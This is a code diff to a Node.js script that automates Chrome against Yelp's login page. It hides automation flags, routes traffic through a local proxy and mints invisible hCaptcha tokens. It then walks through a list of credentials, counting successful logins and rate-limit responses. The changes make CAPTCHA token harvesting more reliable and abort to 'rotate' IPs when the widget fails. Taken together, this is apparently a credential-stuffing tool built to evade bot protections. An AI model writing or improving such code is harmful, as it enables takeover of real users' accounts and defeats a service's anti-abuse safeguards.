@@ -93,6 +93,10 @@ function paceDelay() {
   const chrome = spawn(process.env.CHROME || 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', [
     '--no-first-run', '--no-default-browser-check', '--disable-blink-features=AutomationControlled',
     '--window-size=900,700', '--lang=en-US', '--user-data-dir=' + udd,
+    // Throttled timers on a backgrounded window freeze the hCaptcha poll, so mint()
+    // only returns via the 40 s CDP timeout with an empty token (see PITFALLS 27).
+    '--disable-background-timer-throttling', '--disable-backgrounding-occluded-windows',
+    '--disable-renderer-backgrounding', '--disable-features=CalculateNativeWinOcclusion,IntensiveWakeUpThrottling',
     '--proxy-server=http://127.0.0.1:' + LP, '--remote-debugging-port=' + CP,
     'https://www.yelp.com/login/'
   ], { stdio: 'ignore' });
@@ -118,6 +122,9 @@ function paceDelay() {
     setTimeout(() => resolve(null), 40000);
   });
   await sendS('Page.enable'); await sendS('Network.enable', {});
+  // Keep the tab focused so Chrome does not throttle its timers.
+  await sendS('Emulation.setFocusEmulationEnabled', { enabled: true });
+  await sendS('Page.bringToFront', {});
 
   let ddok = false;
   for (let k = 0; k < 25; k++) {
@@ -152,7 +159,7 @@ function paceDelay() {
       }
       var d=document.createElement('div'); d.id='__fcap'; d.style.display='none';
       document.body.appendChild(d);
-      try { window.__wid=window.hcaptcha.render(d,{sitekey:'${SITEKEY}',size:'invisible'}); }
+      try { window.__wid=window.hcaptcha.render(d,{sitekey:'${SITEKEY}',size:'invisible',callback:function(t){window.__fcTok=t;}}); }
       catch(e){ return 'err:'+e.message; }
       window.__own=true; window.__fcReady=true;
       return 'own:'+window.__wid;
@@ -163,6 +170,7 @@ function paceDelay() {
     if(!w){ res(''); return; }
     var done=false;
     function fin(t){ if(!done){ done=true; res(t||''); } }
+    window.__fcTok='';
     try {
       var ta=document.querySelector('textarea[name=h-captcha-response],input[name=h-captcha-response]');
       if(ta) ta.value='';
@@ -171,12 +179,12 @@ function paceDelay() {
     var n=0;
     var iv=setInterval(function(){
       n++;
-      var t='';
-      try { t=window.hcaptcha.getResponse(w)||''; } catch(e){}
+      var t=window.__fcTok||'';
+      if(!t){ try { t=window.hcaptcha.getResponse(w)||''; } catch(e){} }
       if(!t){ var el=document.querySelector('textarea[name=h-captcha-response],input[name=h-captcha-response]'); if(el) t=el.value||''; }
       if(t){ clearInterval(iv); fin(t); }
-      else if(n>160){ clearInterval(iv); fin(''); }
-    },150);
+      else if(n>60){ clearInterval(iv); fin(''); }
+    },200);
   })`);
 
   let ok = await hydrate(4);
@@ -193,6 +201,7 @@ function paceDelay() {
   let validated = 0, success = 0, unable = 0, link = 0, closed = 0, unknown = 0, r429 = 0, r403 = 0, r407 = 0, tokFail = 0, posted = 0;
   const successes = [], msAll = [], tokAll = [], postAll = [];
   let blocked = false;
+  let tokStreak = 0;   // consecutive empty-token mints; 2 means the widget is dead
 
   for (let i = 0; i < creds.length && !blocked; i++) {
     if (Date.now() - t0 > MAXT) { rec({ event: 'timecap', at: i }); break; }
@@ -207,7 +216,17 @@ function paceDelay() {
       const tt = Date.now();
       const tok = await mint();
       const tokMs = Date.now() - tt;
-      if (!tok) tokFail++;
+      // An empty hcaptcha_response makes Yelp answer "We're unable to log you in right
+      // now." for every credential, so never spend a POST on it. Two in a row means the
+      // widget/IP is dead: abort the chunk and rotate instead of burning the budget.
+      if (!tok) {
+        tokFail++; tokStreak++;
+        rec({ event: 'tokfail', at: i + 1, tokMs, streak: tokStreak });
+        if (tokStreak >= 2) { rec({ event: 'abort', why: 'captcha', at: i + 1, tokMs }); blocked = true; break; }
+        await sleep(1500);
+        continue;
+      }
+      tokStreak = 0;
 
       const tp = Date.now();
       postTimes.push(Date.now());
